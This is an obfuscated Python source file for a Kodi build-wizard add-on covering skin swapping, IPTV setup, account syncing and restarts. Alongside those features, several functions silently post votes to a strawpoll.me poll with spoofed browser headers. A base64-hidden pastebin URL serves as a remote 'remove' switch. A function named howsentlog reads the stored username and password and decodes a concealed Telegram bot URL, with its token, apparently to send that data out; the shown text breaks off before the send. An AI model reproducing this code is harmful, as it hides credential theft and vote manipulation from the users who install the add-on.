# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	O0OOO0000OOO000OO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OO000OOO0000OO00O =[];O00000O0OO00O00O0 =[]#line:267
	for OO000O00OO0OOOO0O in sorted (O0OOO0000OOO000OO ,key =lambda O0O0O0O0OOO00OO00 :O0O0O0O0OOO00OO00 ):#line:268
		OOO0O000O0OOO000O =os .path .split (OO000O00OO0OOOO0O [:-1 ])[1 ]#line:269
		O00OO0O0O0000OOO0 =os .path .join (OO000O00OO0OOOO0O ,'addon.xml')#line:270
		if os .path .exists (O00OO0O0O0000OOO0 ):#line:271
			OO00000000O00OO00 =open (O00OO0O0O0000OOO0 )#line:272
			O0000O000O0000OO0 =OO00000000O00OO00 .read ()#line:273
			OOO0OOOOOO00O0O0O =parseDOM2 (O0000O000O0000OO0 ,'addon',ret ='id')#line:274
			OOO00000O0O00O000 =OOO0O000O0OOO000O if len (OOO0OOOOOO00O0O0O )==0 else OOO0OOOOOO00O0O0O [0 ]#line:275
			try :#line:276
				O0000OOOO0O0O0O0O =xbmcaddon .Addon (id =OOO00000O0O00O000 )#line:277
				OO000OOO0000OO00O .append (O0000OOOO0O0O0O0O .getAddonInfo ('name'))#line:278
				O00000O0OO00O00O0 .append (OOO00000O0O00O000 )#line:279
			except :#line:280
				pass #line:281
	OO00OOO00000OOOOO =[];O0O00OOO00OO00O00 =0 #line:282
	OOOO0OO00O00O0000 =["Current Skin -- %s"%currSkin ()]+OO000OOO0000OO00O #line:283
	O0O00OOO00OO00O00 =DIALOG .select ("Select the Skin you want to swap with.",OOOO0OO00O00O0000 )#line:284
	if O0O00OOO00OO00O00 ==-1 :return #line:285
	else :#line:286
		O0O0OOO0OOO0OO0OO =(O0O00OOO00OO00O00 -1 )#line:287
		OO00OOO00000OOOOO .append (O0O0OOO0OOO0OO0OO )#line:288
		OOOO0OO00O00O0000 [O0O00OOO00OO00O00 ]="%s"%(OO000OOO0000OO00O [O0O0OOO0OOO0OO0OO ])#line:289
	if OO00OOO00000OOOOO ==None :return #line:290
	for O00O0O00OO00O0OOO in OO00OOO00000OOOOO :#line:291
		swapSkins (O00000O0OO00O00O0 [O00O0O00OO00O0OOO ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (OO000OO0O0OOOOO0O ,title ="Error"):#line:296
	O0O0000O0OO0O0OO0 ='lookandfeel.skin'#line:297
	OOO00OO0OO000O0O0 =OO000OO0O0OOOOO0O #line:298
	O00OOO0O0000OO00O =getOld (O0O0000O0OO0O0OO0 )#line:299
	OO0OO0OO00OOOO00O =O0O0000O0OO0O0OO0 #line:300
	setNew (OO0OO0OO00OOOO00O ,OOO00OO0OO000O0O0 )#line:301
	OOO000O000O0O00O0 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO000O000O0O00O0 <100 :#line:303
		OOO000O000O0O00O0 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (OOOOO00O000O000O0 ):#line:310
	try :#line:311
		OOOOO00O000O000O0 ='"%s"'%OOOOO00O000O000O0 #line:312
		OOOOOOO0000000OO0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOOOO00O000O000O0 )#line:313
		O0O0OOO000O0O000O =xbmc .executeJSONRPC (OOOOOOO0000000OO0 )#line:315
		O0O0OOO000O0O000O =simplejson .loads (O0O0OOO000O0O000O )#line:316
		if O0O0OOO000O0O000O .has_key ('result'):#line:317
			if O0O0OOO000O0O000O ['result'].has_key ('value'):#line:318
				return O0O0OOO000O0O000O ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (O0O00OOOOO0O0OOOO ,O00OO00O000O000O0 ):#line:325
	try :#line:326
		O0O00OOOOO0O0OOOO ='"%s"'%O0O00OOOOO0O0OOOO #line:327
		O00OO00O000O000O0 ='"%s"'%O00OO00O000O000O0 #line:328
		O0O00OO00OOO0O0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0O00OOOOO0O0OOOO ,O00OO00O000O000O0 )#line:329
		O0OOOO00O00OOO00O =xbmc .executeJSONRPC (O0O00OO00OOO0O0O0 )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			O000O0OOOO0OO0OOO =xbmcgui .DialogProgress ()#line:340
			O000O0OOOO0OO0OOO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			O000O0OOOO0OO0OOO .update (0 )#line:344
			for O0OOO0OOO00O0OO00 in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				O000O0OOOO0OO0OOO .update (int ((5 -O0OOO0OOO00O0OO00 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OOO0OOO00O0OO00 ),'')#line:347
				if O000O0OOOO0OO0OOO .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			O000O0OOOO0OO0OOO =xbmcgui .DialogProgress ()#line:353
			O000O0OOOO0OO0OOO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			O000O0OOOO0OO0OOO .update (0 )#line:357
			for O0OOO0OOO00O0OO00 in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				O000O0OOOO0OO0OOO .update (int ((5 -O0OOO0OOO00O0OO00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOO0OOO00O0OO00 ),'')#line:360
				if O000O0OOOO0OO0OOO .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O0O0OOOOO0OOOOO00 ='18773068'#line:373
    OO00OOO00O00000O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OOOOO0OOOOO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    O0O0OO0OOOO00O0OO ='145273320'#line:387
    O00000OO0OOOOOOOO ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        OO000OO00OO0O00O0 =O0O0OO0OOOO00O0OO #line:390
    else :#line:391
        OO000OO00OO0O00O0 =O00000OO0OOOOOOOO #line:392
    OOOOO0000OO0OO0O0 ={'options':OO000OO00OO0O00O0 }#line:396
    OOO0OOO0000000O00 =requests .post ('https://www.strawpoll.me/'+O0O0OOOOO0OOOOO00 ,headers =OO00OOO00O00000O0 ,data =OOOOO0000OO0OO0O0 )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        OOOO000000OOOOOO0 ='18773068'#line:402
        O000OO0O000O0OOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOO000000OOOOOO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        OOOO000O00O0000OO ='145273320'#line:416
        OOO00OO0O0OO0O0OO ={'options':OOOO000O00O0000OO }#line:422
        OOOOOOO0000O0000O =requests .post ('https://www.strawpoll.me/'+OOOO000000OOOOOO0 ,headers =O000OO0O000O0OOOO ,data =OOO00OO0O0OO0O0OO )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        OOO00OOO00O000OO0 ='18773068'#line:429
        OOO000OO000O00OO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO00OOO00O000OO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        O0O0O0O00O00OO0OO ='145273321'#line:443
        OOO000OO0OO0OO0O0 ={'options':O0O0O0O00O00OO0OO }#line:449
        OO0O00O0O0OO00O0O =requests .post ('https://www.strawpoll.me/'+OOO00OOO00O000OO0 ,headers =OOO000OO000O00OO0 ,data =OOO000OO0OO0OO0O0 )#line:451
   except :pass #line:452
def testcommand ():#line:456
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.telemedia')):#line:457
		O000O0OO0OO0OO00O =xbmcaddon .Addon ('plugin.video.telemedia')#line:458
	if os .path .exists (os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","plugin.video.telemedia/database","td.binlog")):#line:459
		O000O0OO0OO0OO00O .setSetting ('autologin','true')#line:460
def skin_homeselect ():#line:461
	try :#line:463
		O0OOO000OO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:464
		O0OOO000000O0OO0O =open (O0OOO000OO00O00OO ,'r')#line:466
		O0O0O0OOOOOO000OO =O0OOO000000O0OO0O .read ()#line:467
		O0OOO000000O0OO0O .close ()#line:468
		OOO0000O0O0OO00OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:469
		OO00O0000O0OO000O =re .compile (OOO0000O0O0OO00OO ).findall (O0O0O0OOOOOO000OO )[0 ]#line:470
		O0OOO000000O0OO0O =open (O0OOO000OO00O00OO ,'w')#line:471
		O0OOO000000O0OO0O .write (O0O0O0OOOOOO000OO .replace ('<setting id="HomeS" type="string%s/setting>'%OO00O0000O0OO000O ,'<setting id="HomeS" type="string"></setting>'))#line:472
		O0OOO000000O0OO0O .close ()#line:473
	except :#line:474
		pass #line:475
def autotrakt ():#line:478
    OO00O000O0OO00O0O =(ADDON .getSetting ("auto_trk"))#line:479
    if OO00O000O0OO00O0O =='true':#line:480
       from resources .libs import trk_aut #line:481
def traktsync ():#line:483
     O0O00OOO0OO0OO00O =(ADDON .getSetting ("auto_trk"))#line:484
     if O0O00OOO0OO0OO00O =='true':#line:485
       from resources .libs import trk_aut #line:488
     else :#line:489
        ADDON .openSettings ()#line:490
def imdb_synck ():#line:492
   try :#line:493
     O000000OOO0O0OOO0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:494
     O0O00OO0000OOO0OO =xbmcaddon .Addon ('plugin.video.gaia')#line:495
     O00OO0OO00OOOO000 =(ADDON .getSetting ("imdb_sync"))#line:496
     OO0OO0OO0OOO00O00 ="imdb.user"#line:497
     OOOO0OOO0OO0OOOOO ="accounts.informants.imdb.user"#line:498
     O000000OOO0O0OOO0 .setSetting (OO0OO0OO0OOO00O00 ,str (O00OO0OO00OOOO000 ))#line:499
     O0O00OO0000OOO0OO .setSetting ('accounts.informants.imdb.enabled','true')#line:500
     O0O00OO0000OOO0OO .setSetting (OOOO0OOO0OO0OOOOO ,str (O00OO0OO00OOOO000 ))#line:501
   except :pass #line:502
def dis_or_enable_addon (O0OO00O0O00OO0OO0 ,O0O0OO0O0OO0000OO ,enable ="true"):#line:504
    import json #line:505
    O00OO000O0O0OOOOO ='"%s"'%O0OO00O0O00OO0OO0 #line:506
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OO00O0O00OO0OO0 )and enable =="true":#line:507
        logging .warning ('already Enabled')#line:508
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OO00O0O00OO0OO0 )#line:509
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OO00O0O00OO0OO0 )and enable =="false":#line:510
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OO00O0O00OO0OO0 )#line:511
    else :#line:512
        OO0OOOOOO0O000000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OO000O0O0OOOOO ,enable )#line:513
        OO0OO0O0OOO000O0O =xbmc .executeJSONRPC (OO0OOOOOO0O000000 )#line:514
        OO000OOOO000O00O0 =json .loads (OO0OO0O0OOO000O0O )#line:515
        if enable =="true":#line:516
            xbmc .log ("### Enabled %s, response = %s"%(O0OO00O0O00OO0OO0 ,OO000OOOO000O00O0 ))#line:517
        else :#line:518
            xbmc .log ("### Disabled %s, response = %s"%(O0OO00O0O00OO0OO0 ,OO000OOOO000O00O0 ))#line:519
    if O0O0OO0O0OO0000OO =='auto':#line:520
     return True #line:521
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:522
def iptvset ():#line:525
  try :#line:526
    O00OOOOOOOO00O000 =(ADDON .getSetting ("iptv_on"))#line:527
    if O00OOOOOOOO00O000 =='true':#line:529
       if KODIV >=17 and KODIV <18 :#line:531
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:532
         OO00OO0OO0O000OOO =xbmcaddon .Addon ('pvr.iptvsimple')#line:533
         OO0000OO0O00OOO0O =(ADDON .getSetting ("iptvUrl"))#line:535
         OO00OO0OO0O000OOO .setSetting ('m3uUrl',OO0000OO0O00OOO0O )#line:536
         O000000O0OOOOO00O =(ADDON .getSetting ("epg_Url"))#line:537
         OO00OO0OO0O000OOO .setSetting ('epgUrl',O000000O0OOOOO00O )#line:538
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:541
         iptvsimpldownpc ()#line:542
         wiz .kodi17Fix ()#line:543
         xbmc .sleep (1000 )#line:544
         OO00OO0OO0O000OOO =xbmcaddon .Addon ('pvr.iptvsimple')#line:545
         OO0000OO0O00OOO0O =(ADDON .getSetting ("iptvUrl"))#line:546
         OO00OO0OO0O000OOO .setSetting ('m3uUrl',OO0000OO0O00OOO0O )#line:547
         O000000O0OOOOO00O =(ADDON .getSetting ("epg_Url"))#line:548
         OO00OO0OO0O000OOO .setSetting ('epgUrl',O000000O0OOOOO00O )#line:549
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:551
         iptvsimpldown ()#line:552
         wiz .kodi17Fix ()#line:553
         xbmc .sleep (1000 )#line:554
         OO00OO0OO0O000OOO =xbmcaddon .Addon ('pvr.iptvsimple')#line:555
         OO0000OO0O00OOO0O =(ADDON .getSetting ("iptvUrl"))#line:556
         OO00OO0OO0O000OOO .setSetting ('m3uUrl',OO0000OO0O00OOO0O )#line:557
         O000000O0OOOOO00O =(ADDON .getSetting ("epg_Url"))#line:558
         OO00OO0OO0O000OOO .setSetting ('epgUrl',O000000O0OOOOO00O )#line:559
  except :pass #line:560
def howsentlog ():#line:567
       try :#line:568
          import json #line:569
          OO0OOOOO0OO0000OO =(ADDON .getSetting ("user"))#line:570
          OO0O00O000OOOOO00 =(ADDON .getSetting ("pass"))#line:571
          OO0O0O0O0O00OOOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:572
          O0OOOO0O0O000OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:574
